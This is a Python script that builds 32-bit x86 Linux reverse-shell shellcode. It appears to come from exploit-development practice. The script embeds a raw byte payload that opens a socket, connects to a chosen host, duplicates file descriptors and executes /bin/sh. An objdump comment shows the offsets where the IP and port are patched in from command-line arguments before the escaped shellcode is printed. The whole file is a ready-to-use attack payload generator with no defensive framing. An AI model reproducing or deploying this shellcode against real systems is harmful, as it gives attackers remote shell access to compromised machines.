#!/usr/bin/env python

import socket
import sys
import struct

'''
$ objdump -M intel -d reverseshell.o
...
15:	68 7f 01 01 01       	push   0x101017f
1a:	66 68 13 ba          	pushw  0xba13
...
'''
PORT_OFFSET = 0x1a + 2
IP_OFFSET = 0x15 + 1

SHELLCODE = bytearray(
    b'\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x13\xba\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x41\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'
)

if len(sys.argv) != 3:
    print('Usage: generate_reverseshell <IP> <port>')
    exit(1)

# Set IP
ip_big_endian = socket.inet_aton(sys.argv[1])
SHELLCODE[IP_OFFSET:IP_OFFSET + 4] = ip_big_endian

# Set port
port_big_endian = socket.htons(int(sys.argv[2]))
SHELLCODE[PORT_OFFSET:PORT_OFFSET + 2] = struct.pack("H", port_big_endian)

# Print shellcode
print('\\x' + '\\x'.join('{:02x}'.format(byte) for byte in SHELLCODE))
